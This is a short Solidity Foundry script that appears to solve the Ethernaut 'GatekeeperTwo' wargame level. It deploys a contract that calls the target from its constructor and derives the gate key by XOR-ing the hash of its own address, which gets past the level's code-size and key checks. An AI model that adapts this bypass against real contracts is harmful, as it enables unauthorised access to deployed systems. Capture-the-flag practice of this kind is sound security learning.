// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import "../src/GatekeeperTwo.sol";

contract GatekeeperTwoScript is Script {

    function setUp() public {
    }

    function run() public {
        vm.startBroadcast();

        new Attack();

        vm.stopBroadcast();
    }
}

contract Attack {

    constructor() {
        GatekeeperTwo target;
        target = GatekeeperTwo(0x878903CcABE8faAA7d8895371104352aBB58c6e6);
        bytes8 gateKey = bytes8(type(uint64).max ^ uint64(bytes8(keccak256(abi.encodePacked(address(this))))));

        target.enter(gateKey);
    }

}
